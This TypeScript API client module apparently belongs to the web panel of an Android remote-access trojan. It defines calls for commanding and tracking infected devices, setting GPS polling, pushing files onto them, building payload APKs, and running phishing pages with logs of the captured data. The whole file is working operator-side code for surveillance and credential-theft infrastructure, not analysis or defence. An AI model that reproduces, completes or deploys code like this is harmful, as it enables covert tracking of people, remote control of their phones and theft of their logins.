import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  timeout: 30000,
  withCredentials: true,
  headers: { 'Content-Type': 'application/json' },
});

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('auth-token');
  if (token && !config.headers?.Authorization) {
    config.headers = config.headers || {};
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

const AUTH_WHITELIST = ['/auth/login', '/auth/logout', '/auth/me'];
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      const url = error.config?.url || '';
      const isAuthEndpoint = AUTH_WHITELIST.some(ep => url.includes(ep));
      if (!isAuthEndpoint) {
        localStorage.removeItem('auth-user');
        localStorage.removeItem('auth-token');
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
    }
    return Promise.reject(error);
  }
);

export default api;

export const authApi = {
  login: (username: string, password: string) => api.post('/auth/login', { username, password }),
  logout: () => api.post('/auth/logout'),
  me: () => api.get('/auth/me'),
  changePassword: (currentPassword: string, newPassword: string) => api.post('/auth/change-password', { currentPassword, newPassword }),
  updateProfile: (data: { username?: string; email?: string }) => api.post('/auth/update-profile', data),
  sessions: () => api.get('/auth/sessions'),
  revokeSession: (id: string) => api.delete(`/auth/sessions/${id}`),
};

export const dashboardApi = { getData: () => api.get('/dashboard') };

export const clientsApi = {
  getAll: () => api.get('/clients'),
  getOne: (id: string) => api.get(`/client/${id}`),
  getPage: (id: string, page: string, signal?: AbortSignal) => api.get(`/client/${id}/${page}`, { signal }),
  delete: (id: string) => api.delete(`/client/${id}`),
  sendCommand: (id: string, cmd: string, params?: Record<string, unknown>) => api.post(`/cmd/${id}/${cmd}`, params || {}),
  setGps: (id: string, interval: number) => api.post(`/gps/${id}/${interval}`),
  assign: (id: string, ownerId: string) => api.put(`/client/${id}/assign`, { ownerId }),
  unassign: (id: string) => api.put(`/client/${id}/unassign`),
};

export const logsApi = {
  getLogs: (params?: { type?: string; category?: string; search?: string; limit?: number }, signal?: AbortSignal) => api.get('/logs', { params, signal }),
  getStats: () => api.get('/logs/stats'),
  clear: () => api.post('/logs/clear'),
};

export const builderApi = {
  getServerUrl: () => api.get('/builder/server-url'),
  build: (formData: FormData) => api.post('/builder/build', formData, { headers: { 'Content-Type': 'multipart/form-data' }, timeout: 600000 }),
  getStatus: () => api.get('/builder/status'),
  downloadApk: (onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get('/builder/download', { responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
};

export const phishingApi = {
  seed: () => api.post('/phishing/seed'),
  getPages: (params?: { page?: number; pageSize?: number; search?: string; category?: string; enabled?: string }, signal?: AbortSignal) => api.get('/phishing/pages', { params, signal }),
  togglePage: (id: number, enabled: boolean) => api.patch(`/phishing/pages/${id}`, { enabled }),
  deletePage: (id: number) => api.delete(`/phishing/pages/${id}`),
  getLogs: (params?: { page?: number; pageSize?: number; slug?: string; search?: string }, signal?: AbortSignal) => api.get('/phishing/logs', { params, signal }),
  clearLogs: () => api.delete('/phishing/logs'),
  getStats: () => api.get('/phishing/stats'),
};

export const filesApi = {
  pushToDevice: (clientId: string, dstPath: string, file: File, onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => {
    const formData = new FormData();
    formData.append('file', file);
    return api.post(`/files/push?clientId=${encodeURIComponent(clientId)}&dst=${encodeURIComponent(dstPath)}`, formData, {
      headers: { 'Content-Type': 'multipart/form-data' },
      timeout: 300000,
      onUploadProgress: onProgress,
    });
  },
};

export const usersApi = {
  getAll: () => api.get('/users'),
  create: (data: { username: string; email: string; password: string; role: string; permissions?: string[] }) => api.post('/users', data),
  update: (id: string, data: { username?: string; email?: string; role?: string; permissions?: string[] }) => api.put(`/users/${id}`, data),
  updatePermissions: (id: string, permissions: string[]) => api.put(`/users/${id}/permissions`, { permissions }),
  getPermissionsSchema: () => api.get('/users/permissions-schema'),
  resetPassword: (id: string, password: string) => api.put(`/users/${id}/password`, { password }),
  regenerateSecret: (id: string) => api.post(`/users/${id}/regenerate-secret`),
  getUserSecret: (id: string) => api.get(`/users/${id}/secret`),
  setUserSecret: (id: string, value: string) => api.post(`/users/${id}/secret`, { value }),
  delete: (id: string) => api.delete(`/users/${id}`),
};

export const configApi = {
  get: () => api.get('/config'),
  set: (key: string, value: string) => api.post('/config', { key, value }),
  getDeviceSecret: () => api.get('/config/device-secret'),
  setDeviceSecret: (value: string) => api.post('/config/device-secret', { value }),
  regenerateDeviceSecret: () => api.post('/config/device-secret/regenerate'),
};

export const setupApi = {
  getStatus: () => axios.get('/api/setup/status'),
  complete: (data: {
    admin: { username: string; email: string; password: string };
    deviceSecret?: string;
    generateDeviceSecret?: boolean;
  }) => axios.post('/api/setup/complete', data),
};

export async function fetchAuthBlob(url: string): Promise<Blob | null> {
  try {
    const token = localStorage.getItem('auth-token');
    const res = await fetch(url, {
      headers: token ? { Authorization: `Bearer ${token}` } : {},
    });
    if (res.status === 401) {

      const isAuthEndpoint = url.includes('/api/auth/') || url.includes('/api/setup/');
      if (!isAuthEndpoint) {
        localStorage.removeItem('auth-user');
        localStorage.removeItem('auth-token');
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
      return null;
    }
    if (!res.ok) return null;
    return await res.blob();
  } catch {
    return null;
  }
}

export async function fetchAuthObjectURL(url: string): Promise<string | null> {
  const blob = await fetchAuthBlob(url);
  return blob ? URL.createObjectURL(blob) : null;
}
